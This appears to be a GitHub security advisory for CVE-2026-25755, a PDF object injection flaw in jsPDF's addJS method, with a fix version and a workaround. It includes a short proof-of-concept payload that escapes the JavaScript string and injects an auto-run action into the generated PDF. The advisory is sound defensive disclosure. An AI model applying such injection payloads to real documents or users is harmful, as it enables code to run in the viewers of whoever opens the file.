# [H] jsPDF has a PDF Object Injection via Unsanitized Input in addJS Method

## Summary
Severity: High
Advisory: GHSA-9vjf-qc39-jprp
CVE: CVE-2026-25755
CWE: CWE-116, CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-02-19
Source: https://github.com/advisories/GHSA-9vjf-qc39-jprp
Type: github-advisory

## Affected
- npm: `jspdf` — affected >=0 <4.2.0

## Details
### Impact

User control of the argument of the `addJS` method allows an attacker to inject arbitrary PDF objects into the generated document. By crafting a payload that escapes the JavaScript string delimiter, an attacker can execute malicious actions or alter the document structure, impacting any user who opens the generated PDF.

```js
import { jsPDF } from "jspdf";
const doc = new jsPDF();
// Payload:
// 1. ) closes the JS string.
// 2. > closes the current dictionary.
// 3. /AA ... injects an "Additional Action" that executes on focus/open.
const maliciousPayload = "console.log('test');) >> /AA << /O << /S /JavaScript /JS (app.alert('Hacked!')) >> >>";

doc.addJS(maliciousPayload);
doc.save("vulnerable.pdf");
```

### Patches
The vulnerability has been fixed in jspdf@4.2.0.

### Workarounds
Escape parentheses in user-provided JavaScript code before passing them to the `addJS` method.
### References
https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md

## References
- https://github.com/parallax/jsPDF/security/advisories/GHSA-9vjf-qc39-jprp
- https://nvd.nist.gov/vuln/detail/CVE-2026-25755
- https://github.com/parallax/jsPDF/commit/56b46d45b052346f5995b005a34af5dcdddd5437
- https://github.com/ZeroXJacks/CVEs/blob/main/2026/CVE-2026-25755.md
- https://github.com/parallax/jsPDF
- https://github.com/parallax/jsPDF/releases/tag/v4.2.0
